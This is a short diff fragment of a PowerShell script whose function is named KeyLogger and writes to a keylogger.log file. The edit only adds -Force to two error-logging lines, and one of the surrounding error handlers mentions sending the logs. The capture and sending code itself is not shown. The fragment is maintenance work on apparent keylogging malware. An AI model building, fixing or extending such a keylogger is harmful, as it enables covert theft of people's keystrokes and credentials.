@@ -50,7 +50,7 @@ function KeyLogger($logFile = "$env:TEMP\keylogger.log") {
     catch {
         # Log any errors for debugging
         $errorMessage = "Error in KeyLogger: $_"
-        Add-Content -Path "$env:TEMP\error_log.txt" -Value $errorMessage
+        Add-Content -Path "$env:TEMP\error_log.txt" -Value $errorMessage -Force
         Write-Host $errorMessage
     }
     finally {
@@ -71,7 +71,7 @@ function KeyLogger($logFile = "$env:TEMP\keylogger.log") {
         } catch {
             # Log any errors when sending the logs
             $errorMessage = "Error sending logs: $_"
-            Add-Content -Path "$env:TEMP\error_log.txt" -Value $errorMessage
+            Add-Content -Path "$env:TEMP\error_log.txt" -Value $errorMessage -Force
             Write-Host $errorMessage
         }
     }
